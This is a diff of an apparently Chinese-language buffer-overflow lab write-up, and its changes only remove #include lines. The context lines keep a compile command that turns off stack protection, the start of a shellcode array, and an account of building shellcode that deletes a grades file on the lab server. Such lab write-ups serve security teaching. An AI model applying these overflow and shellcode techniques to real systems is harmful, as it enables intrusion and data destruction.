@@ -11,9 +11,6 @@ excerpt: "Exercise 1：根据如下代码，打印出buffer数组的地址，其
 #Exercise 1：
 　　添加printf代码即可，注意地址需要用%p，编译并运行程序三次，可以得出三次地址各不相同。
 ```
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
 void badman()
 {
     printf("I am the bad man\n");
@@ -86,10 +83,6 @@ cat address.txt
 　　实验过程如图所示，取得了控制权。
 　　`gcc -g -z execstack -fno-stack-protector -o stack2 stack2.c`
 ```
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-
 char shellcode[]=
   "\x31\xc0" 
   "\x50" 
@@ -188,7 +181,6 @@ char req[1069];
 
 　　先研究了create-shell.c文件中汇编指令之如何实现删除一个文件的，后来发现只需要把文件路径转化成十六进制的ascii码值，然后压栈，就可以完成删除工作，那么写了个小程序ascii.c把自己想要删除的文件路径转化成十六进制数据，然后写入create-shell.c文件中然后生成了shellcode，在放入test-shell.c文件中测试，发现成功啦！然后在写入shellcode进行攻击，终于攻击服务器成功了。
 ```
-#include<stdio.h>
 int main()
 {
     char s[] = "0/home/seed/security/lab1-code/grades.txt";
